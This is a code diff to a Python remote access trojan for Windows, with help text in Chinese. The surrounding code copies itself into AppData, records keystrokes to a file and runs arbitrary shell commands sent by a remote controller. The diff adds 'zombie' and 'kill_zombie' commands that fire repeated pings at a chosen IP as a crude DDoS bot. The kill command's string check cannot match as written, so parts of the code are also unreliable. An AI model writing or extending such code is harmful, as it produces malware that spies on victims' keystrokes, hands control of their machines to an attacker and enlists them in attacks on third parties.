@@ -17,6 +17,7 @@ file_location = os.environ["appdata"] + "\\srv.exe"
 image_file = "\\kayoko.png"
 keylog_file = os.environ["appdata"] + "\\srv.txt"
 captured_keys = ""
+zombies = []
 
 def process_keys(key):
     """
@@ -136,6 +137,8 @@ def handle_communication():
                             "keylog_start          - 開始鍵盤記錄\n"
                             "keylog_dump           - 顯示鍵盤記錄數據\n"
                             "<command>             - 執行CMD命令\n"
+                            "zombie <ip> <port>    - 創建DDoS殭屍\n"
+                            "kill_zombie           - 停止DDoS殭屍\n"
                             "q                     - 退出")
             send_data(help_details)
         elif command[:2] == "cd" and len(command) > 1:
@@ -190,6 +193,20 @@ def handle_communication():
                 send_data(kl.read())
         elif command[:3] == "pwd":
             send_data(os.getcwd())
+        elif command[:6] == "zombie": # use ping command to create a zombie
+            ip, port = command[7:].split(" ")
+            try:
+                subprocess.Popen(f"ping -n 100 {ip}", shell=True)
+                zombies.append((ip, port))
+                send_data(f"[+] Zombie created at {ip}:{port}")
+            except:
+                send_data("[!!] Failed to create zombie!")
+        elif command[:10] == "kill_zombie":
+            try:
+                subprocess.Popen(f"taskkill /IM ping.exe /F", shell=True)
+                send_data(f"[+] All zombies killed!")
+            except:
+                send_data("[!!] Failed to kill zombie!")
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             response = proc.stdout.read() + proc.stderr.read()
